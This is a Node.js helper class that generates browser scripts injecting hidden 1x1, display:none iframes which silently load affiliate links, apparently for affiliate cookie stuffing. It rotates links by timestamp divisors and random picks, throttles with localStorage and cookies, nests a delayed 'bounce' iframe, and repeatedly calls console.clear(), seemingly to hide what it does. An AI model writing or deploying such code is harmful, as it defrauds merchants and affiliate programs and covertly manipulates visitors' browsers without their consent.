const fs = require('fs');
const path = require('path');
const directory = 'output';

class generate_helper{
  generate_js(advertisor,affiliate,country,callback ){
    var generate = "var a = Math.round(new Date().getTime() / 1000);";
    generate += 'var e = "";';
        for(var i=0; i <advertisor.length;i++)
        {
          if(advertisor[i].is_divisor_needed == 1 && advertisor[i].type==2) //If multi type and need divison
          {
            generate += "if (a % "+advertisor[i].multi_divisor+" == 0) {";
          }

          generate += "var "+advertisor[i].adv_name.toLowerCase()+"_time =(parseInt(a) + ("+advertisor[i].enabled_time+" * 60 * 60));";
          var cookie_custom_name = advertisor[i].adv_name.toLowerCase().replace("a","").replace("e","").replace("o","");

          generate += "if (typeof(localStorage['"+cookie_custom_name+"']) == 'undefined' || localStorage['"+cookie_custom_name+"'] <= a) {";
          generate += " localStorage['"+cookie_custom_name+"'] = "+advertisor[i].adv_name.toLowerCase()+"_time;";
          if(advertisor[i].type == 3)  //Multi choose product
          {
            generate += "var z_links = new Array(";
            for(var j=0; j <affiliate.length;j++)
            {
              if(affiliate[j].affiliate_type == 1)
              {
                generate += "'"+affiliate[j].link+"',";
              }              
            }
            generate = generate.slice(0, -1);
            generate += ");";
          }
          if(advertisor[i].type == 3 && advertisor[i].is_divisor_needed == 0)  //Multi choose product without divisor
          {
            generate += "var rand = (Math.floor(Math.random() * "+parseInt(advertisor[i].product_count)+") + 1  );";
            generate += "e += \"<iframe src='\"+z_links[rand]+\"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";                
      
          }else{
            if(advertisor[i].is_divisor_needed == 0 || advertisor[i].type==2)  //Not dividing in numbers or is of multi type
            {
              for(var j=0; j <affiliate.length;j++)
              {
                if(affiliate[j].adv_id == advertisor[i].adv_id) //check to ensure first come "if" to all advertisors
                {
                  generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
                }
              }
             
            }else{  //Dividing afiiliates by divisors
              generate += "var f = Math.floor(Date.now() / 1000);";
              
              for(var j=0,k=0; j <affiliate.length;j++)
              {               
                
                if(affiliate[j].adv_id == advertisor[i].adv_id) //check to ensure first come "if" to all advertisors
                {
                  if(affiliate[j].affiliate_type == 0)
                  {
                    if(k == 0)
                    {
                      generate += "if (f % "+affiliate[j].divisor+" == 0) {";
                    }else if(affiliate[j].divisor > 1){
                      generate += "} else if (f % "+affiliate[j].divisor+" == 0) {";
                    }else if(affiliate[j].divisor == 1){
                      generate += "} else {";
                    }
                  
                    if(affiliate[j].link == "multi_choice_prod")
                    {
                      generate += "var z_rand = (Math.floor(Math.random() * "+parseInt(advertisor[i].product_count)+") + 1  );";
                      generate += "e += \"<iframe src='\"+z_links[z_rand]+\"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
                    }else{
                      generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
                    }                    
                  }
                  k++;
                }            
              }
              generate += "}";  
            }
          }
          
          if(advertisor[i].is_bounce_req == 1)
          {
            generate += "var bnc = Math.floor(Date.now() / 1000);";
            generate += "if (bnc % 4 == 0){";
            generate += "setTimeout(function(){var zl = document.getElementById('"+advertisor[i].bounce_frame_id+"').contentWindow.document;zl.open();zl.write(\"<iframe src='"+advertisor[i].bounce_url+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\");zl.close();}, 8000);";
            generate += "}";
          }
          generate += "}";
          if(advertisor[i].is_divisor_needed == 1 && advertisor[i].type==2) //If multi type and need divison
          {
            generate += "}";
          }
        } //End of for loop

        generate += 'if (e != "") {e += "<script>setTimeout(doSomething, 6000);setTimeout(doSomething, 8000);setTimeout(doSomething, 12000);setTimeout(doSomething, 15000);function doSomething() { console.clear();  }	</script>";var g = document.getElementById("hindu-3421").contentWindow.document;g.open();g.write(e);g.close();}';
        if(country)
        {
          var out={};
          out[country] = generate;
          callback(out);
        }else{
          callback(generate);
        }      
    }



/* Generate Self JS */

  generate_self_js(advertisor,affiliate,country,callback ){
    var generate = "$(document).ready(function(){";
    generate += 'var e = "";';
    for(i=0; i <advertisor.length;i++)
    {    
      var cookie_custom_name = "is"+advertisor[i].adv_name.toLowerCase().replace("a","").replace("e","").replace("o","");
      generate += "if(typeof($.cookie('"+cookie_custom_name+"')) == \"undefined\"){";    
      
      if(advertisor[i].type == 3)  //Multi choose product
      {
        generate += "var z_links = new Array(";
        for(var j=0; j <affiliate.length;j++)
        {
          generate += "'"+affiliate[j].link+"',";
        }
        generate = generate.slice(0, -1);
        generate += ");";

        generate += "var rand = (Math.floor(Math.random() * "+parseInt(process.env.PRODUCT_LIMIT)+") + 1  );";
        // var redir_url = "https://ads.mybestprice.my/ads/redir.php?url=";
        // generate += "e += \"<iframe src='"+redir_url+"\"+encodeURIComponent(z_links[rand])+\"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
        generate += "e += \"<iframe src='\"+z_links[rand]+\"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";

      }else{
        if(advertisor[i].is_divisor_needed == 0)  //Not dividing in numbers
        {
          for(var j=0; j <affiliate.length;j++)
          {
            if(affiliate[j].adv_id == advertisor[i].adv_id) //check to ensure first come "if" to all advertisors
            {
              generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
            }
          }      
        }else{ 
          generate += "var f = Math.floor(Date.now() / 1000);";
          
          for(var j=0,k=0; j <affiliate.length;j++)
          {
            if(affiliate[j].adv_id == advertisor[i].adv_id) //check to ensure first come "if" to all advertisors
            {
                if(k == 0)
                {
                  generate += "if (f % "+affiliate[j].divisor+" == 0) {";
                }else if(affiliate[j].divisor > 1){
                  generate += "} else if (f % "+affiliate[j].divisor+" == 0) {";
                }else if(affiliate[j].divisor == 1){
                  generate += "} else {";
                }
                
                generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
              k++;
            }            
          }
          generate += "}";  
        }
      }      

      var iframe_name = "frm"+advertisor[i].country+"_"+advertisor[i].adv_name;
      generate += "$('body').append('<iframe id=\""+iframe_name+"\" style=\"display:none\" marginwidth=\"0\" marginheight=\"0\" hspace=\"0\" frameborder=\"0\" vspace=\"0\" scrolling=\"no\"> </iframe>');    var doc = document.getElementById(\""+iframe_name+"\").contentWindow.document;    doc.open();doc.write(e);doc.close();";

      generate += "$.cookie('isplaAmzz', '1', { expires: "+advertisor[i].enabled_time+", path: '/' });";
      generate += "}";
        
    } //End of for loop
    
      generate += "});";
      if(country)
      {
        var out={};
        out[country] = generate;
        callback(out);
      }else{
        callback(generate);
      }
  }

}

module.exports = generate_helper;